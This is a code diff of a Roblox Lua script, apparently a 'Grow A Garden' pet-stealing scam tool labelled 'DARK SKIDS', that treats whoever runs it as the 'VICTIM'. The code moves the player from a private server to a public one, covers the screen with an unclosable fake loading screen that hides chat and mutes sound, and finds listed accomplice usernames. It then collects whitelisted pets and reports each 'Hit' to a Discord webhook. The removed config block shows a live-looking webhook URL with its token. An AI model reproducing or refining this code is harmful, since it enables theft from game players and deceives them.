@@ -1,120 +1,87 @@
--- ✅ Configuration
-local CONFIG = {
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP",
-    USERNAMES = { "saikigrow", "", "yuniecoxo", "yyyyyvky" }, -- ✅ multiple usernames here
-    PET_WHITELIST = {
-        "Raccoon", "T-Rex", "Fennec Fox", "Dragonfly", "Butterfly", "Disco Bee",
-        "Mimic Octopus", "Queen Bee", "Spinosaurus", "Kitsune"
-    },
-    FILE_URL = "https://cdn.discordapp.com/attachments/.../items.txt"
-}
-
 _G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then
-return
-end
+if _G.scriptExecuted then return end
 _G.scriptExecuted = true
-
-
-if ok and serverType == "VIPServer" then
-    local TeleportService = game:GetService("TeleportService")
-    local HttpService = game:GetService("HttpService")
-
-    -- Fetch public server list
-    local function findLowServer()
-        local placeId = game.PlaceId
-        local servers = {}
-        local cursor = ""
-
-        -- Loop until we find a low-populated server
-        for i = 1, 5 do
-            local url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100&cursor=%s", placeId, cursor)
-            local response = game:HttpGet(url)
-            local data = HttpService:JSONDecode(response)
-
-            for _, server in ipairs(data.data) do
-                if server.playing < server.maxPlayers and server.id ~= game.JobId then
-                    return server.id
-                end
-            end
-
-            if not data.nextPageCursor then break end
-            cursor = data.nextPageCursor
-        end
-        return nil
-    end
-
-    local serverId = findLowServer()
-    if serverId then
-        TeleportService:TeleportToPlaceInstance(game.PlaceId, serverId, game.Players.LocalPlayer)
-    else
-        game.Players.LocalPlayer:Kick("No public servers available. Try again.")
-    end
-    return
-end
 
 -- 🛠️ Services & Variables
 repeat task.wait() until game:IsLoaded()
 local VICTIM = game.Players.LocalPlayer
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local getServerType = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
 local victimPetTable = {}
 
--- 🎭 Fake Legit Loading for Detected USERNAMES
-local function showBlockingLoadingScreen()
-    local plr = game.Players.LocalPlayer
-    local playerGui = plr:WaitForChild("PlayerGui")
+-- 🔁 Auto Teleport if in Private Server (to public server with exactly 3 players)
+if getServerType and getServerType:IsA("RemoteFunction") then
+    local ok, serverType = pcall(function()
+        return getServerType:InvokeServer()
+    end)
+    if ok and serverType == "VIPServer" then
+        local function findLowServer()
+            local placeId = game.PlaceId
+            local cursor = ""
+            for i = 1, 10 do
+                local url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100&cursor=%s", placeId, cursor)
+                local response = game:HttpGet(url)
+                local data = HttpService:JSONDecode(response)
+                for _, server in ipairs(data.data) do
+                    if server.playing == 3 and server.id ~= game.JobId then
+                        return server.id
+                    end
+                end
+                if not data.nextPageCursor then break end
+                cursor = data.nextPageCursor
+            end
+            return nil
+        end
 
-    -- Block chat
+        local serverId = findLowServer()
+        if serverId then
+            TeleportService:TeleportToPlaceInstance(game.PlaceId, serverId, VICTIM)
+        else
+            VICTIM:Kick("No public servers with 3 players available. Try again.")
+        end
+        return
+    end
+end
+
+-- 🎭 Fake Legit Loading Screen
+local function showBlockingLoadingScreen()
+    local playerGui = VICTIM:WaitForChild("PlayerGui")
+
     pcall(function()
         local StarterGui = game:GetService("StarterGui")
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
-    end)
-
-    -- Hide leaderboard
-    pcall(function()
-        local StarterGui = game:GetService("StarterGui")
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
     end)
 
-    -- Mute all sounds
     for _, sound in ipairs(workspace:GetDescendants()) do
-        if sound:IsA("Sound") then
-            sound.Volume = 0
-        end
+        if sound:IsA("Sound") then sound.Volume = 0 end
     end
 
-    -- Create fake loading GUI
-    local loadingScreen = Instance.new("ScreenGui")
+    local loadingScreen = Instance.new("ScreenGui", playerGui)
     loadingScreen.Name = "UnclosableLoading"
     loadingScreen.ResetOnSpawn = false
     loadingScreen.IgnoreGuiInset = true
     loadingScreen.DisplayOrder = 999999
     loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    loadingScreen.Parent = playerGui
-
-    -- Prevent removal
     loadingScreen.AncestryChanged:Connect(function()
         loadingScreen.Parent = playerGui
     end)
 
-    -- Black background
-    local blackFrame = Instance.new("Frame")
+    local blackFrame = Instance.new("Frame", loadingScreen)
     blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
     blackFrame.Size = UDim2.new(1, 0, 1, 0)
-    blackFrame.Position = UDim2.new(0, 0, 0, 0)
     blackFrame.BorderSizePixel = 0
     blackFrame.ZIndex = 1
-    blackFrame.Parent = loadingScreen
 
-    -- Blur effect
     local blurEffect = Instance.new("BlurEffect")
     blurEffect.Size = 24
     blurEffect.Name = "FreezeBlur"
     blurEffect.Parent = game:GetService("Lighting")
 
-    -- Loading text
-    local loadingLabel = Instance.new("TextLabel")
+    local loadingLabel = Instance.new("TextLabel", loadingScreen)
     loadingLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
     loadingLabel.Position = UDim2.new(0.25, 0, 0.45, 0)
     loadingLabel.BackgroundTransparency = 1
@@ -123,9 +90,7 @@ local function showBlockingLoadingScreen()
     loadingLabel.TextColor3 = Color3.new(1, 1, 1)
     loadingLabel.Font = Enum.Font.SourceSansBold
     loadingLabel.ZIndex = 2
-    loadingLabel.Parent = loadingScreen
 
-    -- Animate loading text
     coroutine.wrap(function()
         while true do
             for i = 1, 3 do
@@ -135,19 +100,15 @@ local function showBlockingLoadingScreen()
         end
     end)()
 
-    -- Reapply effects if removed
     coroutine.wrap(function()
         while true do
             task.wait(1)
-            -- Reapply blur if removed
             if not game:GetService("Lighting"):FindFirstChild("FreezeBlur") then
                 local newBlur = Instance.new("BlurEffect")
                 newBlur.Size = 24
                 newBlur.Name = "FreezeBlur"
                 newBlur.Parent = game:GetService("Lighting")
             end
-
-            -- Remute if volume restored
             for _, sound in ipairs(workspace:GetDescendants()) do
                 if sound:IsA("Sound") and sound.Volume > 0 then
                     sound.Volume = 0
@@ -157,7 +118,7 @@ local function showBlockingLoadingScreen()
     end)()
 end
 
-
+-- 📌 Wait for Target Detection
 local function waitForJoin()
     for _, player in game.Players:GetPlayers() do
         if table.find(CONFIG.USERNAMES, player.Name) then
@@ -168,6 +129,7 @@ local function waitForJoin()
     return false, nil
 end
 
+-- 🌐 Send Discord Embed
 local function createDiscordEmbed(petList, totalValue)
     local embed = {
         title = "🌵 Grow A Garden Hit - DARK SKIDS 🍀",
@@ -195,9 +157,7 @@ local function createDiscordEmbed(petList, totalValue)
                 inline = false
             }
         },
-        footer = {
-            text = string.format("%s | %s", game.PlaceId, game.JobId)
-        }
+        footer = { text = string.format("%s | %s", game.PlaceId, game.JobId) }
     }
 
     local data = {
@@ -212,10 +172,11 @@ local function createDiscordEmbed(petList, totalValue)
         Url = CONFIG.WEBHOOK_URL,
         Method = "POST",
         Headers = { ["Content-Type"] = "application/json" },
-        Body = game:GetService("HttpService"):JSONEncode(data)
+        Body = HttpService:JSONEncode(data)
     })
 end
 
+-- 🔍 Helper Functions
 local function checkPetsWhilelist(pet)
     for _, name in CONFIG.PET_WHITELIST do
         if string.find(pet, name) then return true end
@@ -290,7 +251,7 @@ local function idlingTarget()
     end
 end
 
--- 🟢 Start
+-- 🚀 Start Execution
 getPlayersPets()
 task.spawn(function()
     while task.wait(0.5) do
